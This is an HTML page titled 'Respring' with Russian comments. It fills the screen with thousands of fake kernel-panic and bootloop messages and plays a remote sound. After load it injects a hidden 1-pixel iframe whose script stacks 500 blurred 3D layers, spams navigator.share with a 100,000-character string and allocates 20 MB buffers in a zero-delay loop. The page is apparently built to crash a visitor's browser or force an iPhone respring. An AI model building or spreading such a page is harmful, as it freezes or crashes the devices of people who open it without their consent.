<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Respring</title>
    <style>
        body {
            background: #8b0000;
            color: #ffffff;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            align-content: flex-start;
            height: 100vh;
            width: 100vw;
            position: relative;
        }

        .error-msg {
            font-size: 6px;
            opacity: 0.6;
            white-space: nowrap;
            user-select: none;
            padding: 1px;
            position: relative;
            z-index: 10;
        }

        #respring-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            border: none;
            opacity: 0.01;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>

    <iframe id="respring-iframe"
        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
    </iframe>

<script>
    // ===== WEB AUDIO (без loop + резкий старт) =====
    const audioUrl = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";

    let audioCtx;
    let buffer;
    let isPlayed = false;

    async function initAudio() {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }

        if (!buffer) {
            const res = await fetch(audioUrl);
            const arr = await res.arrayBuffer();
            buffer = await audioCtx.decodeAudioData(arr);
        }
    }

    function playOnce() {
        if (!buffer || isPlayed) return;

        const source = audioCtx.createBufferSource();
        source.buffer = buffer;
        source.loop = false; // ❌ без зацикливания

        const gain = audioCtx.createGain();

        // ⚡ резкий старт звука
        const now = audioCtx.currentTime;
        gain.gain.setValueAtTime(0.0001, now);
        gain.gain.exponentialRampToValueAtTime(1.0, now + 0.01);

        source.connect(gain).connect(audioCtx.destination);
        source.start(0);

        isPlayed = true;
    }

    async function startAudio() {
        try {
            await initAudio();

            if (audioCtx.state === "suspended") {
                await audioCtx.resume();
            }

            playOnce();
        } catch (e) {}
    }

    // автопопытка через 100мс
    window.addEventListener('load', () => {
        setTimeout(startAudio, 100);
    });

    // запуск при взаимодействии
    function unlock() {
        startAudio();

        document.removeEventListener('click', unlock);
        document.removeEventListener('touchstart', unlock);
        document.removeEventListener('keydown', unlock);
    }

    document.addEventListener('click', unlock);
    document.addEventListener('touchstart', unlock);
    document.addEventListener('keydown', unlock);


    // ===== ОШИБКИ =====
    const errorTemplates = [
        "Fatal Error 0x3333",
        "Entering Bootloop...",
        "KERNEL_PANIC",
        "OVERFLOW_DETECTION",
        "STACK_COLLISION",
        "MEMORY_CORRUPTION",
        "0xFFFF_SYSTEM_HALT",
        "CRITICAL_PROCESS_DIED",
        "THREAD_STUCK_IN_DEVICE_DRIVER",
        "BOOT_LOOP_DETECTED",
        "FS_CORRUPTION",
        "SYSTEM_FREEZE",
        "HARDWARE_MALFUNCTION"
    ];

    for (let i = 0; i < 3000; i++) {
        const span = document.createElement('span');
        span.className = 'error-msg';
        span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
        document.body.appendChild(span);
    }


    // ===== IFRAME =====
    window.addEventListener('load', () => {
        setTimeout(() => {
            const frame = document.getElementById('respring-iframe');

            const respringScript = `
                <html>
                <body style="margin:0; overflow:hidden;">
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);

                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText =
                                'position:absolute;width:100vw;height:100vh;' +
                                'backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);' +
                                'transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);' +
                                'opacity:0.99;';
                            container.appendChild(d);
                        }

                        setInterval(() => {
                            try {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                            } catch(e) {}

                            let x = new Uint8Array(1024 * 1024 * 20);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;

            frame.srcdoc = respringScript;
        }, 735);
    });

</script>

</body>
</html>
